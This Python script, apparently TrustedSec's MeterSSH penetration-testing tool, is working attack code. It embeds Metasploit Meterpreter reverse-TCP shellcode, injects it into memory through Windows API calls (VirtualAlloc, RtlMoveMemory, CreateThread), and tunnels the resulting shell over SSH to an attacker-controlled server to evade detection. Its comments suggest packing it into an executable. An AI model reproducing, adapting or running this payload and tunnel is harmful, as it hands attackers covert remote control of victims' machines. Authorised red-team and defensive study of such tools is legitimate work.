from socket import socket
from ctypes import pythonapi
from io import StringIO
import socketserver as SocketServer  
import sys, os, paramiko, time, ctypes, _thread, select


#####################################################################################
#
#                    MeterSSH
#           Tunneling Shellcode over SSH
#
#   Written by: David Kennedy (ReL1K)
#   Website: https://www.trustedsec.com
#   Twitter: @TrustedSec @HackingDave
#
# Simple add your username, password, remote IP, and remote port
# for your SSH server and watch the magic.
#
# Note that you can easily make this into a binary with pyinstaller or py2exe
#
# Special thanks for version 2 from shellster
#
#####################################################################################


listener_setup = False

# define our shellcode injection code through ctypes
def inject(shellcode):
    global listener_setup

    #Dirty wait for listener setup
    while listener_setup == False:
        time.sleep(1) 
    
    print('[*] Shellcode injection loaded into memory...')
    print('[*] You should have a shell raining in a sec...')
    
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(shellcode)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
    ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                       ctypes.c_int(len(shellcode)))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(shellcode)))
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.c_int(ptr),
                                             ctypes.c_int(0),
                                             ctypes.c_int(0),
                                             ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
    
class ForwardServer (SocketServer.ThreadingTCPServer):
    def __init__(self, con, handler):
        super().__init__(con, handler)
        global listener_setup
        listener_setup = True
        
    daemon_threads = True
    allow_reuse_address = True
    
class Handler (SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel('direct-tcpip', (self.chain_host, self.chain_port), self.request.getpeername())
        except Exception as e:
            print('Incoming request to %s:%d failed: %s' % (self.chain_host, self.chain_port, repr(e)))
            return
        
        if chan is None:
            print('Incoming request to %s:%d was rejected by the SSH server.' % (self.chain_host, self.chain_port))
            return

        #print('Connected!  Tunnel open %r -> %r -> %r' % (self.request.getpeername(), chan.getpeername(), (self.chain_host, self.chain_port)))
        
        try:
            while True:
                r, w, x = select.select([self.request, chan], [], [])
                if self.request in r:
                    data = self.request.recv(1024)
                    if len(data) == 0:
                        break
                    chan.send(data)
                if chan in r:
                    data = chan.recv(1024)
                    if len(data) == 0:
                        break
                    self.request.send(data)
        except:
            pass
        finally:
            peername = self.request.getpeername()
            chan.close()
            self.request.close()
            
        print('Tunnel closed from %r' % (peername,))


def forward_tunnel(local_host, local_port, remote_host, remote_port, transport):
    # this is a little convoluted, but lets me configure things for the Handler
    # object.  (SocketServer doesn't give Handlers any way to access the outer
    # server normally.)
    class SubHander (Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport
    
    ForwardServer((local_host, local_port), SubHander).serve_forever()

# main class here
def main(user, privatekey, password, rhost, port, rport):
    # Update server port from command line if provided.
    if len(sys.argv) == 2:
        temp = sys.argv[1].split(':')
        rhost = temp[0]
        port = temp[1]
        
        if len(temp) == 3:
            rport = temp[2]
    
    server = [rhost, int(port)]  # our ssh server 
    remote = [rhost, int(rport)] # what we want to tunnel
    client = paramiko.SSHClient() # use the paramiko SSHClient
    client.load_system_host_keys() # load SSH keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) # automatically add SSH key
    
    # loop until you connect successfully
    while True:
        try:
            pkey = None
                 
            if privatekey:
                fkey = StringIO(privatekey)
                
                if 'BEGIN RSA' in privatekey:
                    pkey = paramiko.RSAKey.from_private_key(fkey)
                elif 'BEGIN DSA' in privatekey or 'BEGIN DSS' in privatekey:
                    pkey = paramiko.DSSKey.from_private_key(fkey)
                elif 'BEGIN ECDSA' in privatekey:
                    pkey = paramiko.ECDSAKey.from_private_key(fkey)
                    
            print('[*] Tunneling SSH, this takes a moment.')
            client.connect(server[0], server[1], username=user, pkey=pkey, look_for_keys=False, password=password)
             
        except Exception as e:
            print('[X] Failed to connect to %s:%d: %r Trying to connect again...' % (server[0], server[1], e))
            time.sleep(5)
        
        else:
            # let you know if you connected successfully then finish
            print('[*] Connected to %s:%d: successfully' % (server[0], server[1]))
            break
         
    try:
        print('[*] Spawning reverse tcp meterpreter to forward over ssh on port: %d' % (remote[1]))
        forward_tunnel('127.0.0.1', 8021, remote[0], remote[1], client.get_transport())
    
    except Exception as e:
        print(e)

if __name__ == '__main__':
    # this is traditional metasploit windows/meterpreter/reverse_tcp that connects to 127.0.0.1 on port 8021 - meterssh will then take port 8021 or specified port and wrap over SSH
    shellcode = bytearray(b'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x7f\x00\x00\x01\x68\x02\x00\x1f\x55\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x3f\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\xe9\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\xc3\x01\xc3\x29\xc6\x75\xe9\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5')
    
    # this starts the main routine which is where we get all our port forward stuff - fill in the information below
    user = '<user>'
    # SSH private key MUST BE exact text and formatting of id_* file (You can set the password to None if you choose this option (Recommended)
    # Set privatekey = None if you want to use a password.
    privatekey = None
    # password for SSH
    password = '<password>'
    # This is where your SSH server is running, but can be None if you plan to specify it by command line on run. 
    rhost = '<ip>'
    # This is the remote SSH port - this is the attackers SSH server, but can be None if you plane to specify it by command line on run.
    port = '<port>'
    # This is the localhost port that your reverse shell handler is listening on
    rport = '<rport>'
    
    try:
        _thread.start_new_thread(inject,(shellcode,))
    except Exception as e:    
        print(e)
    
    try:
        main(user, privatekey, password, rhost, port, rport)
    except Exception as e:
        print(e)
        
    while True:
        time.sleep(1)
